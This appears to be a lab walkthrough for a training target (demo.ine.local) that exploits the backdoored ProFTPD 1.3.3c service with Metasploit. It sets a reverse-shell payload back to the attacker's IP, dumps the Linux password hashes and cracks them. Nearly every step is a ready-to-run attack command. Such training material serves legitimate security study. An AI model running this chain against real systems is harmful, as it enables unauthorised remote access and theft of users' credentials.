#### ProFTPD 1.3.3c Backdoor Exploitation and Password Cracking

##### Check Target Connectivity

```
ping -c 4 demo.ine.local
```

##### Scan the Target

```
nmap -sS -sV demo.ine.local
```

Detected service:

```
ProFTPD 1.3.3c
```

##### Scan for Known Vulnerabilities

```
nmap --script vuln -p 21 demo.ine.local
```

Result:

```
Backdoored ProFTPD installation detected
```

##### Start the PostgreSQL Service

```
/etc/init.d/postgresql start
```

##### Exploit the ProFTPD Backdoor

Replace `<KALI_IP>` with the attacker’s IP address:

```
msfconsole -q
use exploit/unix/ftp/proftpd_133c_backdoor
set PAYLOAD cmd/unix/reverse
set RHOSTS demo.ine.local
set LHOST <KALI_IP>
exploit -z
```

##### Dump Linux Password Hashes

```
use post/linux/gather/hashdump
set SESSION 1
exploit
```

##### Crack the SHA-512 Hashes

```
use auxiliary/analyze/crack_linux
set SHA512 true
run
```